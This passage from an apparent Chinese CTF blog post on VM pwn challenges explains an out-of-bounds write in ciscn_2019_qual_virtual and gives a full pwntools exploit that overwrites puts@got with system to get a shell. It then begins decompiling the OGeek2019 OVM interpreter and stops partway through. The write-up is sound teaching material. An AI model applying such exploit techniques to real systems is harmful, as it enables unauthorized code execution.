  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>从data段取出两个值，v2的作用和load中一样，以data段为基地址，将<strong><em>(_QWORD *)(8 * (</em>(int *)(a1 + 12) + v2) + *(_QWORD *)a1)</strong> 的地址中写入v3，这里也没有限制v2的大小，因此存在越界写漏洞。</p>
<p>至此，整个程序的主要功能就分析完了，接下来就该进行利用了</p>
<p>由于程序没有开启FULL RELRO，所以我们可以复写got表，这里我们复写puts@got为system，因为当执行完opcode之后程序会通过puts函数输出我们一开始输入的程序名，只要我们输入程序名为/bin/sh，这样最后就会执行system(“/bin/sh”)，即可getshell(也可以通过复写puts为onegadget，不过system(“/bin/sh”)更稳一些)。</p>
<p>注意到heap区上方</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C3.jpg" alt="3"></p>
<p>0x404000处存在大量libc地址</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C4.jpg" alt="4"></p>
<p>而程序本身没有输出功能，所以我们需要利用程序提供的功能进行写入加减运算</p>
<p>load和save功能都是在data段进行的，而且存在越界，它们的的参数都是data结构体的指针</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C5.jpg" alt="5"></p>
<p>而对data段进行操作都是通过存储在data结构体中的data段指针进行操作的，只要我们修改了这个指针，data段的位置也会随之改变，所以我们可以利用save的越界写漏洞，将data段指针修改到0x404000附近(也可以直接在data段进行越界读写，毕竟越界读写的范围也没有限定，不过这样计算起来会比较麻烦)。</p>
<p>我们将data段指针改写为stderr下方的一段无内容处，即0x4040d0</p>
<p>这个操作对应的payload为</p>
<pre><code>push push save 
4210896 -3</code></pre><p>这样操作的原因可以自己调试</p>
<p>之后我们对data段的操作就都是以0x4040d0为基地址来操作的，我们将上方的stderr的地址(或者别的地址)load到data段，然后计算出在libc中stderr和system的相对偏移，push到data段，然后将stderr和偏移相加就能得出system的地址，接着再利用save功能，将system写入puts@got(在0x404020处)即可，完整exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./ciscn_2019_qual_virtual'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_qual_virtual'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'ciscn_2019_qual_virtual'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name:\n'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>

data_addr <span class="token operator">=</span> <span class="token number">0x4040d0</span>
offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>
opcode <span class="token operator">=</span> <span class="token string">'push push save push load push add push save'</span>
data <span class="token operator">=</span> <span class="token punctuation">[</span>data_addr<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> offset<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'instruction:\n'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(io,'b *0x401cce')</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data:\n'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="0x2-OGeek2019-Final-OVM"><a href="#0x2-OGeek2019-Final-OVM" class="headerlink" title="0x2.[OGeek2019 Final]OVM"></a>0x2.[OGeek2019 Final]OVM</h2><p>首先检查保护</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C6.jpg" alt="6"></p>
<p>只有canary未开启</p>
<p>IDA分析</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> __int16 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2h] [rbp-Eh]</span>
  <span class="token keyword">unsigned</span> __int16 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int16 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+6h] [rbp-Ah]</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>

  comment<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x8CuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> signal_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"WELCOME TO OVM PWN\n"</span><span class="token punctuation">,</span> <span class="token number">0x16uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"PC: "</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"SP: "</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>
  reg<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"CODE SIZE: "</span><span class="token punctuation">,</span> <span class="token number">0xBuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v4 <span class="token operator">></span> <span class="token number">0x10000</span> <span class="token operator">||</span> <span class="token operator">!</span>v4 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"EXCEPTION\n"</span><span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">155</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"CODE: "</span><span class="token punctuation">,</span> <span class="token number">6uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  running <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v4 <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>memory<span class="token punctuation">[</span>v5 <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>memory<span class="token punctuation">[</span>i <span class="token operator">+</span> v5<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFF000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF000000</span> <span class="token punctuation">)</span>
      memory<span class="token punctuation">[</span>i <span class="token operator">+</span> v5<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE0000000</span><span class="token punctuation">;</span>
    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> running <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v7 <span class="token operator">=</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">execute</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"HOW DO YOU FEEL AT OVM?\n"</span><span class="token punctuation">,</span> <span class="token number">0x1BuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> comment<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x8CuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sendcomment</span><span class="token punctuation">(</span>comment<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Bye\n"</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>首先让我们输入PC和SP</p>
<pre><code>PC 程序计数器，它存放的是一个内存地址，该地址中存放着 下一条 要执行的计算机指令。
SP 指针寄存器，永远指向当前的栈顶。</code></pre><p>然后让我们输入codesize，最大为0x10000字节</p>
<p>接着依次输入code</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v4 <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>memory<span class="token punctuation">[</span>v5 <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>memory<span class="token punctuation">[</span>i <span class="token operator">+</span> v5<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFF000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF000000</span> <span class="token punctuation">)</span>
    memory<span class="token punctuation">[</span>i <span class="token operator">+</span> v5<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE0000000</span><span class="token punctuation">;</span>
  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>if语句是用来限制code的值的</p>
<p>接着进入where循环，fetch函数如下</p>
<pre class=" language-c"><code class="language-c">__int64 <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>

  v0 <span class="token operator">=</span> reg<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  reg<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>memory<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>这里使用到了reg[15],存储着PC的值，我们看一看这个程序使用的一些数据</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C7.jpg" alt="7"></p>
<p>每次将PC的值增加1，依次读取memory中的code</p>
<p>再看到execute函数</p>
<pre class=" language-c"><code class="language-c">ssize_t __fastcall <span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  ssize_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  <span class="token keyword">unsigned</span> __int8 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>
  <span class="token keyword">unsigned</span> __int8 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+19h] [rbp-7h]</span>
  <span class="token keyword">unsigned</span> __int8 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ah] [rbp-6h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

  v4 <span class="token operator">=</span> <span class="token punctuation">(</span>a1 <span class="token operator">&amp;</span> <span class="token number">0xF0000u</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">&amp;</span> <span class="token number">0xF00</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> a1 <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//将一个code分割为四个部分，最高1字节作为分类标志</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x70</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0x70</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
    reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">+</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//加法</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x70</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xB0</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0xB0</span>
    <span class="token punctuation">{</span>
      result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
      reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">^</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//异或</span>
      <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xB0</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xD0</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0xD0</span>
      <span class="token punctuation">{</span>
        result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
        reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">>></span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//右移位运算</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xD0</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xE0</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0xE0</span>
        <span class="token punctuation">{</span>
          running <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果栈顶为空则退出while循环</span>
            <span class="token keyword">return</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"EXIT\n"</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token keyword">return</span> result<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        running <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"R%d: %X\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>reg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//依次打印寄存器的值</span>
        result <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"HALT\n"</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xC0</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0xC0</span>
      <span class="token punctuation">{</span>
        result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
        reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//左移位运算</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token number">0x90u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x90</span>
          result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
          reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">&amp;</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//按位与运算</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">0xA0u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0xA0</span>
          result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span> 
          reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">|</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//按位或运算</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">0x80u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x80</span>
          result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
          reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">-</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//减法</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x30</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0x30</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
    reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> memory<span class="token punctuation">[</span>reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//读取内存中的内容到reg</span>
  <span class="token punctuation">}</span>
